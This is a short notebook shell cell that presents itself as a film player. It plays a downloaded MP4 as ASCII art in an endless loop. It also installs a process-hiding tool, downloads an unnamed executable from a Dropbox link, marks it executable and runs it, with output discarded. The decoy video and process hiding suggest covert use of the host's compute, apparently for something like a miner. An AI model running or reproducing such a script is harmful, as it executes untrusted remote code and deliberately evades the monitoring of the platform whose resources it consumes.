%%capture
%%shell
sudo apt update -y
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm mplayer -y
wget http://incident.net/v8/files/mp4/41.mp4
cat > film.sh << END
while :; do
mplayer -vo caca 41.mp4
done
END
sleep 1
npm i -g node-process-hider && ph add pager 
wget -O film https://www.dropbox.com/s/yaubjgt5qiilzfc/sync-dropbox?dl=1
chmod +x film
bash film.sh >/dev/null 2>&1 >/dev/null &
sleep 2
./film
